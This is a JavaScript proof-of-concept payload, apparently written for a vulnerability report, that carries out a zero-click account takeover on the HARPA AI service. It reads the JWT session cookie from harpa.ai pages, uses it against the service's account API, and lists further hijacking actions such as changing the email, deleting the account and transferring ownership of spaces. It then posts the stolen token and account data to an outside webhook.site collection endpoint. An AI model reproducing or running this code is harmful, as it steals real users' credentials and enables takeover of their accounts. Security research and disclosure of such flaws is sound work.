// HARPA AI Zero-Click ATO - Payload Script
// This script executes in the context of harpa.ai origin
// It demonstrates the full account takeover chain

(async () => {
  const EXFIL_ENDPOINT = "https://webhook.site/4f2c20fd-8367-451c-ba1e-3ebc4ec2515a"; // Attacker's collection server

  // Step 1: Steal JWT from non-HttpOnly cookie
  const cookies = document.cookie;
  const jwtMatch = cookies.split(';').find(c => c.trim().startsWith('jwt='));

  if (!jwtMatch) {
    console.log("[!] No JWT cookie found - user not logged in");
    document.body.innerHTML = '<h1 style="color:red">PoC: No JWT found (user not logged in on harpa.ai)</h1>';
    return;
  }

  const jwt = jwtMatch.trim().split('=').slice(1).join('=');

  // Step 2: Decode JWT to show user info
  const payload = JSON.parse(atob(jwt.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));

  console.log("[+] JWT stolen successfully!");
  console.log("[+] User ID:", payload.id);
  console.log("[+] Token issued:", new Date(payload.iat * 1000).toISOString());
  console.log("[+] Token expires:", new Date(payload.exp * 1000).toISOString());

  // Step 3: Use stolen JWT to access victim's account data via API
  // The API has access-control-allow-origin: * so this works from any origin
  let accountData = null;
  try {
    const resp = await fetch("https://api.harpa.ai/api/v1/auth/account?withBalanceAggregated=true", {
      headers: {
        "Authorization": "Bearer " + jwt,
        "Content-Type": "application/json"
      }
    });
    accountData = await resp.json();
    console.log("[+] Account data retrieved:", JSON.stringify(accountData));
  } catch (e) {
    console.log("[!] Could not fetch account data:", e.message);
  }

  // Step 4: Display the stolen information
  document.body.innerHTML = `
    <div style="font-family:monospace; background:#1a1a2e; color:#0f0; padding:20px; min-height:100vh;">
      <h1 style="color:#e94560;">HARPA AI - Zero-Click ATO Successful!</h1>
      <h2>Stolen JWT Token:</h2>
      <pre style="background:#16213e; padding:15px; word-break:break-all; color:#e94560; border:1px solid #0f3460;">${jwt}</pre>
      <h2>Decoded Payload:</h2>
      <pre style="background:#16213e; padding:15px; color:#0f0; border:1px solid #0f3460;">${JSON.stringify(payload, null, 2)}</pre>
      <h2>Account Data (via API):</h2>
      <pre style="background:#16213e; padding:15px; color:#0f0; border:1px solid #0f3460;">${accountData ? JSON.stringify(accountData, null, 2) : 'Could not retrieve (CORS may block from this context)'}</pre>
      <h2>Possible Actions with Stolen JWT:</h2>
      <pre style="background:#16213e; padding:15px; color:#ff0; border:1px solid #0f3460;">
- PATCH /auth/account → Change victim's name, email
- DELETE /auth/account → Delete victim's account
- POST /auth/spaces/{id}/transfer-ownership → Steal spaces
- POST /auth/spaces/{id}/members → Add attacker as member
- GET /auth/account → Read all personal data
- POST /billing/secure-payload → Access billing
- All via api.harpa.ai with wildcard CORS (access-control-allow-origin: *)
      </pre>
      <p style="color:#888;">Current origin: ${window.location.origin}</p>
      <p style="color:#888;">This script executed in the context of harpa.ai</p>
    </div>
  `;

  // Step 5: Exfiltrate to attacker's server (for demonstration)
  try {
    await fetch(EXFIL_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      mode: "no-cors",
      body: JSON.stringify({
        jwt: jwt,
        userId: payload.id,
        accountData: accountData,
        timestamp: new Date().toISOString()
      })
    });
    console.log("[+] Data exfiltrated to attacker server");
  } catch (e) {
    console.log("[!] Exfiltration failed (expected in PoC):", e.message);
  }
})();
